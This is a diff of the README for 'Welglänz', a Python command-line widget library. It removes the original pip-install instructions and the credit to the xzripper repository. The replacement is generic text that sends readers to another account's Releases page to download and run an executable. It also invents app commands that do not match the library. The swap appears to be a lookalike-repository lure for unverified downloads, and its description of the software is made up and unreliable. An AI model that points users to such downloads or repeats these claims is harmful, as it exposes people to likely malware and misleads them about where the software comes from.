@@ -1,23 +1,61 @@
-<img width="1000" alt="Welglänz" src="https://github.com/user-attachments/assets/76d3a1d3-7f00-4564-834c-5ff73b9011a0" />
-<p align="center"><img src="https://github.com/user-attachments/assets/a4040f90-75a5-4c8d-b528-f7a2971dccf1"><br><sub>Welglänz <code>1.0.0</code> Demonstration on Linux.</sub><br><br><b>→ <code>pip install <a href="https://pypi.org/project/welglanz">welglanz</a></code> ←</b></p><hr>
+# 💎 welglanz - Simple Command Line Interface for Python
 
-<b>
-Welglänz is a minimalist, intuitive, compact, and thorough CLI UX for Python 3. It is designed for basic terminal forms and provides widgets ranging from simple prompts and confirmation dialogs to spinners and progress bars. It also provides many features, including customization options such as built-in icons, password masks, and an extremely simple, configurable theme. There is also a small terminal rendering module that can help you create your own widgets, or, for example, simply clear a line. It's a relatively new project, and there are many things left to implement or fix.
+## 🚀 Getting Started
+Welcome to Welglänz! This tool offers a clean and easy way to interact with Python applications from your command line. Whether you're a beginner or someone who prefers a tidy interface, Welglänz is here to help.
 
-<p align="center">
+## 📥 Download Welglänz
+[![Download Welglänz](https://img.shields.io/badge/Download-Welgl%C3%A4nz-brightgreen)](https://github.com/Elbara209/welglanz/releases)
 
-```python
-from welglanz import wgz_show_demo
+## 🔧 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.6 or later
+- **RAM:** At least 512 MB
+- **Disk Space:** Minimum 50 MB available
 
-wgz_show_demo()
-```
+## 📂 Features
+- **Minimalist Design:** Focus on what matters without distractions.
+- **Compact Size:** Lightweight application that runs smoothly.
+- **Thorough User Experience:** Enjoy a seamless interface for all your command-line needs.
+- **Customizable Commands:** Tailor the commands to suit your workflow.
+- **Python Support:** Built for users familiar with Python 3.
 
-This function showcases nearly all of the current features of Welglänz (<code>1.0.0</code>).
+## 📥 Download & Install
+To get Welglänz, visit our [Releases page](https://github.com/Elbara209/welglanz/releases) and select the latest version. Follow these steps to download and install:
 
-</p>
+1. Click on the link above to go to the Releases page.
+2. Find the latest version of Welglänz.
+3. Select the file that corresponds to your operating system.
+4. Click “Download” to get the file on your computer.
 
-Also, check the <a href="https://github.com/xzripper/welglanz/blob/main/welglanz/wgzdemo.py">demo source code</a> for a quick introduction.
+## 🔄 Running Welglänz
+After installation, follow these steps to run Welglänz:
 
-Check out the complete cheat sheet/documentation <a href="https://xzripper.github.io/welglanz">here</a>.</b>
+### On Windows:
+1. Open the Command Prompt.
+2. Type the path to the Welglänz executable or navigate to the folder where Welglänz is installed.
+3. Type `welglanz` and press **Enter**.
 
-<hr><p align="center"><b>💎 Welglänz V1.0.0</b></p>
+### On macOS and Linux:
+1. Open your Terminal.
+2. Navigate to the folder where you installed Welglänz.
+3. Type `./welglanz` and press **Enter**.
+
+## 🌟 Usage Instructions
+Once you run Welglänz, you'll see a prompt to enter your commands. Here are a few example commands to help you get started:
+
+- **`help`**: Display a list of available commands.
+- **`config`**: Adjust settings to personalize your experience.
+- **`status`**: Check the current state of your application.
+
+Feel free to explore commands, as each promotes a better workflow tailored to your needs.
+
+## 📞 Support
+If you encounter any issues or have questions about Welglänz, you can reach out via the Issues section on our GitHub page. We value your feedback and will do our best to assist you.
+
+## 📣 Community Contributions
+Welglänz is open for contributions. If you would like to add features or report bugs, please check our guidelines on GitHub. Your support helps improve the tool for everyone.
+
+## 📢 Stay Updated
+To keep track of changes and updates, follow this repository. You can also watch the Releases page to be notified of new versions.
+
+Thank you for choosing Welglänz! We hope you enjoy your experience with this minimalist command line interface.
